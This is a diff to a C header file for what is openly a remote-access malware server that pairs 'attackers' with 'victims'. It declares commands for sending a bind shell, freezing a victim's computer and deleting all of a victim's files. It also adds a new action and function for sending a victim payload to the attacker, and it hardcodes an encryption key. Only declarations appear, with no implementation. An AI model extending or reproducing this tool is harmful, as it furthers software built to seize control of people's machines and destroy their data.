@@ -9,14 +9,15 @@
 #include <netinet/in.h> 
 #include <sys/time.h> //FD_SET, FD_ISSET, FD_ZERO macros 
 #include <time.h>
+#include <stdbool.h>
 #include "md5.h"
 #include "client_data_structure.h"
 
-#define TRUE 1 
-#define FALSE 0 
+
 #define MTU 1024
 #define PORT 50007
 #define MAX_VICTIMS_PER_ATTACKER 10
+#define MAX_PAYLOAD_TO_BUFFER_COMMEND_LEN 100
 
 #define ENCRYPTED_TEXT_LEN(len) (int) ((len * 1.36) + 100)
 #define AES_KEY "PASS_AES_KEY" // obfuscate it !!! lol
@@ -44,6 +45,7 @@ typedef enum {
 	SEND_BIND_SHELL_COMMAND,
 	STUCK_VICTIMS_COMPUTER,
 	DELETE_VICTIMS_ALL_FILES,
+	GET_VICTIM_PAYLOAD,
 } action_type;
 
 typedef struct {
@@ -129,3 +131,4 @@ void set_attacker_victim_connection (client_ptr * attacker, client_ptr * client_
 void send_to_attacker_connected_victims (client_ptr attacker, client_ptr client_list, int num_of_connected_clients);
 char * encrypt_text (char * text_to_encrypt, char * encrypt_key);
 char * decrypt_text (char * text_to_decrypt, char * decryption_key);
+void send_payload_to_attacker(int attacker_fd);
